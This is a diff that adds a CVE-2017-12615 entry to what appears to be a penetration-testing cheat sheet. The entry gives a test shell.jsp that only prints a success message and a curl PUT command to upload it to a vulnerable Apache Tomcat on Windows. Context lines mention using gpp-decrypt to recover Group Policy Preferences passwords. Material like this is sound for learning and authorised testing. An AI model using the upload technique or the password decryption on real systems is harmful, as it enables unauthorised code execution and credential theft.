@@ -257,3 +257,14 @@ https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
 password string within groups.xml can be exploited by running gpp-decrypt
 gpp-decrypt <gp_password_string>
 ```
+
+### [CVE-2017-12615]
+Based on the article below you can exploit Apache Tomcat 7.0.0 to 7.0.79 running on Windows.
+https://github.com/breaktoprotect/CVE-2017-12615
+```
+shell.jsp:
+<% out.write("<html><body><h3>[+] JSP file successfully uploaded via curl and JSP out.write  executed.</h3></body></html>"); %>
+```
+```
+curl -X PUT https://example/path/where/to/put/shell.jsp/ -d @- < shell.jsp
+```
